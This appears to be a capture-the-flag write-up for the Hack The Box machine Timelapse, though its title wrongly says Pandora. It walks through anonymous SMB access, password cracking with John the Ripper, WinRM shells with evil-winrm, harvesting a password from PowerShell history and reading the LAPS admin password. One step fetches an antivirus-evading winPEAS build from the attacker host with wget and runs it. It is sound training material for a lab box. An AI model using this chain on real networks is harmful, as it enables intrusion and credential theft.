---
title:  "Walkthrough: Pandora - Hack The Box"
date:   "2022-08-20 00:00:00 -0800"
categories: HackTheBox
header:
 teaser: /assets/images/HackTheBox/Timelapse/Timelapse.png
---

![Timelapse Info Card](/assets/images/HackTheBox/Timelapse/Timelapse.png)

In this box, we get our foothold from a file in an open SMB share. Then we use John the Ripper to crack two passwords and get both a private key and a certificate we can use to authenticate to the box using WinRM. After that, we poke around through the PowerShell history and pivot to a new user that can read Local Admin Password Solution (LAPS) passwords. Lastly, we get the LAPS password for the box and use that that to get in as the local admin.

## Nmap

First, we’ll start by running nmap. We’re not under a time crunch here, so we’ll just enumerate versions and run the default scripts on all ports using the `-sC`, `-sV`,  and `-p-` options. `10.10.11.152` was the IP address of the box when I completed it.

```bash
sudo nmap -sC -sV -p- 10.10.11.152
```

Results:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 17:19 EDT
Nmap scan report for 10.10.11.152
Host is up (0.11s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-08-15 05:26:02Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-08-15T05:27:34+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
51601/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2022-08-15T05:26:57
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 500.49 seconds
```

There are a lot of open ports here, but based on these results it looks like we're dealing with a windows domain controller.

## Foothold
Let's start by seeing if there's anything in the SMB shares that we can get to. We'll use `smbclient` for this.

```bash
smbclient -L \\\\10.10.11.152\\
```

`-L` lists out all of the available shares. Use an empty password (just hit enter when prompted for one).

Results:

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`Shares` looks interesting here.

Running

```bash
smbclient \\\\10.10.11.152\\Shares
```

and using an empty password again gives us an SMB prompt.

Using `ls` reveals that there are two directories in this share, `Dev` and `Helpdesk`. Let's just download all of the files from these shares using the following commands

```bash
mask ""
recurse ON
prompt OFF
mget *
```

Looking through all of these files, there is some documentation related to Microsoft's [Local Admin Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) and a zip folder called `winrm_backup.zip`. WinRM stands for "Windows Remote Management". That sounds like a good way in. Opening up the zip archive shows us that there is a file called `legacyy_dev_auth.pfx`, but we can't read it because the archive is password protected. Not a problem for us, assuming that they're not using a complex password.

## User

Let's crack the password with [JohnTheRipper](https://github.com/openwall/john). First, we'll get the password hash from the zip file. Run this command

```bash
zip2john winrm_backup.zip > zip.hash
```

This will generate a file called `zip.hash` that contains the password hash for the zip file in `PKZIP` format. Now we can crack the hash using the ever popular `rockyou.txt` password list.

```bash
john zip.hash --wordlist=<PATH TO ROCKYOU.TXT> --format=PKZIP
```

This very quickly shows us that the password for this zip file is `supremelegacy`.

Now we can extract the `legacyy_dev_auth.pfx` file. This is also password-protected so let's crack this one too.

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=<PATH TO ROCKYOU.TXT>
```

And after a bit, we get back a password of `thuglegacy`.

Now, we can divide this cert up into both a public and private key.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key # Use thuglegacy as the import password. Set the PEM pass phrase to whatever you want
openssl rsa -in priv.key -out priv-decr.key # Use the PEM pass phrase as the import password here
openssl pkcs12 -in legacyy_dev_auth.pfx -out public.pem -clcerts -nokeys # Use thuglegacy as the import password
```

This gives us a certificate (a.k.a. a public key) and a decrypted private key. Running

```bash
cat public.pem
```

shows us that the username associated with this certificate is `Legacyy` (from the subject field).

Now we should be able to get access to the machine using WinRM.


We'll use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to establish our shell. Since we're going to be using key and the cert for authentication, we should enable SSL.
```bash
evil-winrm -u Legacyy --ssl -c cpublic.pem -k priv-decr.key -i 10.10.11.152
```

This will put us directly into a PowerShell session as the `Legacyy` user. We can get `user.txt` if we navigate to this user's desktop.

## Pivot

Next, we'll do some basic enumeration with [winPEAS](https://github.com/carlospolop/PEASS-ng). Download the latest release of `winPEASx64_ofs.exe` to your PC. We're going to use the obfuscated version so we can get around any weirdness with virus detection. Put that into a folder where it can be all on its own somewhere on your computer.

Now, to get it to our system, we will use python's `http.server` module. Run `ifconfig` to get your IP address on the VPN (it should start with `10.`). Next, navigate to the folder where you downloaded winPEAS and run this command:

```bash
python -m http.server
```
**_Note:_** This will expose all of the files in the folder and any sub-folders, so make sure you're not in a folder with anything secret or important.

Now we'll get it to the box. On the PowerShell session, run these commands 

```powershell
wget -UseBasicParsing http://10.10.16.31:8000/winPEASx64_ofs.exe -o file.exe
./file.exe
```

This should launch winPEAS.

We can see pretty plainly here that our computer name is `DC01`. Remember that because we'll use it later. Also, this section is interesting

```
╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 434B
```

Running

```powershell
cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

gives us the contents of that file, which are

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Looks like `E3R$Q62^12p7PLlC%KWaxuaV` is the password for `svc_deploy`.

Let's look for some more info about that `svc_deploy` user.

```powershell
get-aduser -identity svc_deploy -properties *
```

Here, we can see that this user is a member of the `LAPS_Readers` group. This sounds like our route to local admin. It's also part of the `Remote Management Users` group, so we can probably leverage that as our entry point.

## Root
First, disconnect from your Evil-WinRM session using `CTRL+C` and then pressing `y`.

Now we'll reconnect as our new user using this command

```bash
evil-winrm -u svc_deploy -p "E3R\$Q62^12p7PLlC%KWaxuaV" --ssl -i 10.10.11.152
```

**_Note:_** We had to add an extra `\` in front of the `$` in the password to escape the special character.

This gets us a new PowerShell session on the box as `svc_deploy`. Now, to read the local admin password from LAPS, we can run this command

```powershell
Get-ADComputer -identity DC01 -Properties ms-Mcs-AdmPwd
```

The password is in the `msMcs-AdmPwd` field. In my case it was `l8BD+@167DS6RrBWP0p&#lm5`.  I'm not sure if this actually rotates like it's supposed to or not, given the nature of Hack The Box boxes.

We'll use this password to log in once again. The default username for LAPS local admins is just `administrator`, so we'll try that first. Exit the current `evil-winrm` session and run this command

```bash
evil-winrm -u "administrator" -p "l8BD+@167DS6RrBWP0p&#lm5" --ssl -i 10.10.11.152
```

And we're in as the local admin!

For some reason, `root.txt` is actually in a different spot than usual on this box. This command should get you the flag

```powershell
cat C:\Users\TRX\Desktop\root.txt
```